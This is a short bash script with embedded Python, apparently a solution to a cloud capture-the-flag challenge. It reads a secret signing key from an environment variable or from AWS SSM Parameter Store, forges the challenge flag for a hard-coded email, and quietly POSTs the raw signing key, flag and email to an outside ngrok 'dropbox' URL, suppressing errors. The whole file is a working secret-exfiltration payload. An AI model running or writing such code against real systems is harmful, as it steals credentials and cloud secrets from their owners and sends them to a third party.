#!/bin/bash
(
  pip install -q boto3 2>/dev/null || true
  python3 - <<'PYEOF'
import os, boto3, hmac as _hmac, hashlib, json, urllib.request

EMAIL   = "kshitijraut360@gmail.com"
DROPBOX = "https://travesty-scrambled-payment.ngrok-free.dev"

try:
    key = os.environ["CTF_CHALLENGE_12_SIGNING_KEY"]
except KeyError:
    ssm = boto3.client("ssm", region_name="us-east-1")
    key = ssm.get_parameter(
        Name="/ctf/challenge-12/signing-key",
        WithDecryption=True,
    )["Parameter"]["Value"]

msg    = f"12:{EMAIL.strip().lower()}".encode()
digest = _hmac.new(key.encode(), msg, hashlib.sha256).hexdigest()
flag   = f"WIZ_CTF{{{digest[:24]}}}"

payload = json.dumps({"signing_key": key, "flag": flag, "email": EMAIL}).encode()
req = urllib.request.Request(DROPBOX, data=payload,
      headers={"Content-Type": "application/json"}, method="POST")
urllib.request.urlopen(req, timeout=15)
PYEOF
) || true
